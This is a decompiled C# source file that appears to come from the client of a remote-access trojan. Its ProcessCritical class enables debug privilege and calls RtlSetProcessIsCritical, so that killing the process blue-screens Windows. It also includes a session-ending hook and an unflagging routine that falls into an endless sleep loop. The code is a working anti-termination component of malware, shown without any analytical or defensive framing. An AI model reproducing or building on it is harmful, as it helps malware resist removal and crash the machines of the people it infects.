using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x0200000C RID: 12
	public static class ProcessCritical
	{
		// Token: 0x0600003E RID: 62 RVA: 0x00003720 File Offset: 0x00001920
		public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
			{
				ProcessCritical.Exit();
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003740 File Offset: 0x00001940
		public static void Set()
		{
			try
			{
				SystemEvents.SessionEnding += ProcessCritical.SystemEvents_SessionEnding;
				Process.EnterDebugMode();
				NativeMethods.RtlSetProcessIsCritical(1U, 0U, 0U);
			}
			catch
			{
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00003788 File Offset: 0x00001988
		public static void Exit()
		{
			try
			{
				NativeMethods.RtlSetProcessIsCritical(0U, 0U, 0U);
			}
			catch
			{
				for (;;)
				{
					Thread.Sleep(100000);
				}
			}
		}
	}
}
